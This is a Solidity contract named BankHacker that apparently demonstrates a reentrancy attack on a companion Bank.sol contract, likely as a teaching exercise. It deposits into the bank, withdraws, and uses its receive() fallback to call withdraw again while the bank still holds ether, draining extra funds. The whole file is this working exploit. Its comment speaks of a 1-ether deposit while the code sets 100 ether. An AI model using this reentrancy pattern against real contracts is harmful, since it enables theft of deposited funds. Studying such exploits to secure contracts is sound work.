// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

/* 
    @dev attempt to hack the Bank.sol contract
    1. Make a bank deposit of 1 ether
    2. Make a legitimate withdrawal of 1 ether on the 
        bank, provided there is enough funds in the 
        contract's ether balance
    3. When the bank pays this contract, it will hit the 
        receive (fallback) routine, which will accept the payment
        and then re-call the withdraw routine provided there
        is at least 1 ether in the bank contract's account. This will
        help to ensure the transaction is not reverted.
 */
 import "./Bank.sol";

contract BankHacker {

    Bank public bank;
    uint private hackAttemptNumber = 0;
    uint private maxHackAttempts = 2;

    event SendDeposit(
        address depositToAddress,
        uint    depositValue,
        string  functionName
    );

    event RequestWithdrawal(
        address withdrawToAddress,
        uint    withdrawalValue,
        string  functionName
    );

    event HackerReceivedFunds(
        address hackerAddress,
        uint    hackedValue,
        uint    hackAttemptNumber,
        string  functionName
    );
    constructor (address payable _bankAddress) {
        // Get reference to the Bank contract
        bank = Bank(_bankAddress);

    }
    function initializeBalance() external payable {
        // Balance sent in msg.value will be added to contract balance automatically
    }
    function makeDeposit() external {
        // make a deposit of 1 ether into the bank contract, then immediately withdraw

        uint depositValue = 100000000000000000000; // 100 ether

        emit SendDeposit(
            address(this),
            depositValue, 
            "makeDeposit"
        );
        
        bank.deposit(payable(address(this)), depositValue);
        this.withdraw();

    }
    function getDepositBalance() external view returns(uint) {
        return bank.getDepositBalance(address(this));
    }

    function withdraw () external payable {
  
        // reset hack attempts
        hackAttemptNumber = 0;

        uint withdrawalValue = 1 ether; // 1 ether

        emit RequestWithdrawal(
            address(this), 
            withdrawalValue, 
            "withdraw"
        );

        // normal withdrawal, not a "hack"
        bank.withdraw(payable(address(this)), withdrawalValue);

    }

    receive () external payable {
        

        if( (address(bank).balance > 1 ether) && (hackAttemptNumber < maxHackAttempts) ) {

            hackAttemptNumber += 1;

            bank.withdraw(payable(address(this)), 1 ether);
            
            emit HackerReceivedFunds(
                address(this), 
                msg.value, 
                hackAttemptNumber, 
                "receive"
            );
        } 
    }

}